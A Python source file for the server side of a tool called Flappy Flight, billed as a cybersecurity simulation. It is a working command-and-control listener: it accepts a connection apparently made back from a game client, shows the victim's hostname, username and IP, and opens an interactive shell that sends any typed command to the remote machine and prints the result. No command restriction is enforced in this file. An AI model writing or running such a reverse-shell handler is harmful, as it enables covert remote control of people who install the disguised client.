"""
Flappy Flight - Listener (Server)
TCP listener that accepts connections from the Flappy Flight client.
Provides an interactive command prompt to send commands to the connected client.
"""

import socket
import sys
import os
import json
import threading
import time

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import LISTENER_HOST, LISTENER_PORT, BUFFER_SIZE, APP_NAME, ALLOWED_COMMANDS


class FlappyFlightListener:
    """TCP Listener for receiving Flappy Flight client connections."""

    def __init__(self, host=LISTENER_HOST, port=LISTENER_PORT):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.client_info = None
        self.running = False

    def print_banner(self):
        """Display the Flappy Flight listener banner."""
        banner = f"""
\033[36m╔══════════════════════════════════════════════════════════╗
║                                                          ║
║     ██████╗██╗   ██╗██████╗ ███████╗██████╗              ║
║    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗             ║
║    ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝             ║
║    ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗             ║
║    ╚██████╗   ██║   ██████╔╝███████╗██║  ██║             ║
║     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝             ║
║                                                          ║
║    ██████╗ ██╗██████╗ ██████╗                             ║
║    ██╔══██╗██║██╔══██╗██╔══██╗                            ║
║    ██████╔╝██║██████╔╝██║  ██║                            ║
║    ██╔══██╗██║██╔══██╗██║  ██║                            ║
║    ██████╔╝██║██║  ██║██████╔╝                            ║
║    ╚═════╝ ╚═╝╚═╝  ╚═╝╚═════╝                            ║
║                                                          ║
║         {APP_NAME} Listener v1.0                       ║
║         Cybersecurity Simulation Tool                    ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝\033[0m
"""
        print(banner)

    def print_help(self):
        """Display available commands."""
        help_text = """
\033[33m╔═══════════════════════════════════════════╗
║           Available Commands              ║
╠═══════════════════════════════════════════╣
║  sysinfo    - Get target system info      ║
║  whoami     - Current username            ║
║  hostname   - System hostname             ║
║  ls         - List directory contents     ║
║  pwd        - Print working directory     ║
║  uname -a   - System information          ║
║  date       - Current date/time           ║
║  id         - User/Group IDs              ║
║  uptime     - System uptime               ║
║  ps aux     - Running processes           ║
║  ifconfig   - Network interfaces          ║
║  ip addr    - IP addresses                ║
║  ──────────────────────────────────────── ║
║  help       - Show this help menu         ║
║  clear      - Clear the screen            ║
║  exit       - Disconnect and exit         ║
╚═══════════════════════════════════════════╝\033[0m
"""
        print(help_text)

    def start_server(self):
        """Start the TCP listener server."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            self.running = True

            print(f"\033[32m[*] Listener started on {self.host}:{self.port}\033[0m")
            print(f"\033[33m[*] Waiting for incoming connection...\033[0m\n")

            return True
        except OSError as e:
            print(f"\033[31m[✗] Failed to start listener: {e}\033[0m")
            if "Address already in use" in str(e):
                print(f"\033[33m[i] Try: kill $(lsof -t -i:{self.port}) or use a different port\033[0m")
            return False

    def wait_for_connection(self):
        """Wait for a client connection."""
        try:
            self.server_socket.settimeout(None)
            self.client_socket, self.client_address = self.server_socket.accept()
            print(f"\033[32m[✓] Connection received from {self.client_address[0]}:{self.client_address[1]}\033[0m")

            # Receive initial system info
            try:
                data = self.client_socket.recv(BUFFER_SIZE)
                self.client_info = json.loads(data.decode())
                self.display_client_info()
            except (json.JSONDecodeError, UnicodeDecodeError):
                print("\033[33m[!] Could not parse client system info.\033[0m")
                self.client_info = {}

            return True
        except KeyboardInterrupt:
            return False
        except Exception as e:
            print(f"\033[31m[✗] Connection error: {e}\033[0m")
            return False

    def display_client_info(self):
        """Display information about the connected client."""
        if not self.client_info:
            return

        print(f"""
\033[36m╔══════════════════════════════════════╗
║      Connected Client Information    ║
╠══════════════════════════════════════╣
║  OS:         {self.client_info.get('os', 'N/A'):>22} ║
║  Release:    {self.client_info.get('os_release', 'N/A'):>22} ║
║  Hostname:   {self.client_info.get('hostname', 'N/A'):>22} ║
║  Username:   {self.client_info.get('username', 'N/A'):>22} ║
║  IP Address: {self.client_info.get('ip_address', 'N/A'):>22} ║
║  Python:     {self.client_info.get('python_version', 'N/A'):>22} ║
║  Arch:       {self.client_info.get('architecture', 'N/A'):>22} ║
╚══════════════════════════════════════╝\033[0m
""")

    def send_command(self, command):
        """Send a command to the connected client and receive the response."""
        try:
            self.client_socket.send(command.encode())
            response = self.client_socket.recv(BUFFER_SIZE * 4)
            return response.decode()
        except (ConnectionResetError, BrokenPipeError, OSError):
            return None

    def interactive_shell(self):
        """Run an interactive command prompt."""
        target_name = self.client_info.get("username", "target") if self.client_info else "target"
        target_host = self.client_info.get("hostname", "unknown") if self.client_info else "unknown"

        print(f"\033[32m[*] Interactive shell ready. Type 'help' for commands.\033[0m\n")

        while self.running:
            try:
                prompt = f"\033[31m{APP_NAME}\033[0m:\033[36m{target_name}@{target_host}\033[0m$ "
                command = input(prompt)

                if not command.strip():
                    continue

                # Local commands
                if command.strip().lower() == "help":
                    self.print_help()
                    continue

                if command.strip().lower() == "clear":
                    os.system("clear" if os.name != "nt" else "cls")
                    continue

                if command.strip().lower() in ("exit", "quit"):
                    print("\033[33m[*] Disconnecting from target...\033[0m")
                    try:
                        self.client_socket.send(b"exit")
                    except Exception:
                        pass
                    break

                # Send command to client
                response = self.send_command(command)

                if response is None:
                    print("\033[31m[✗] Connection lost!\033[0m")
                    break

                print(f"\n{response}\n")

            except KeyboardInterrupt:
                print("\n\033[33m[*] Use 'exit' to disconnect.\033[0m")
                continue
            except EOFError:
                break

    def run(self):
        """Main listener execution flow."""
        self.print_banner()

        if not self.start_server():
            return

        try:
            while self.running:
                if self.wait_for_connection():
                    self.interactive_shell()

                    # Clean up client connection
                    if self.client_socket:
                        try:
                            self.client_socket.close()
                        except Exception:
                            pass
                        self.client_socket = None

                    # Ask if want to wait for another connection
                    try:
                        again = input("\n\033[33m[?] Wait for another connection? (y/n): \033[0m")
                        if again.lower() != 'y':
                            break
                        print(f"\033[33m[*] Waiting for incoming connection...\033[0m\n")
                    except (KeyboardInterrupt, EOFError):
                        break
                else:
                    break

        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        """Stop the listener."""
        self.running = False
        print("\n\033[33m[*] Shutting down listener...\033[0m")

        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass

        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass

        print("\033[32m[✓] Listener stopped.\033[0m")


def main():
    """Entry point for the listener."""
    listener = FlappyFlightListener()
    listener.run()


if __name__ == "__main__":
    main()
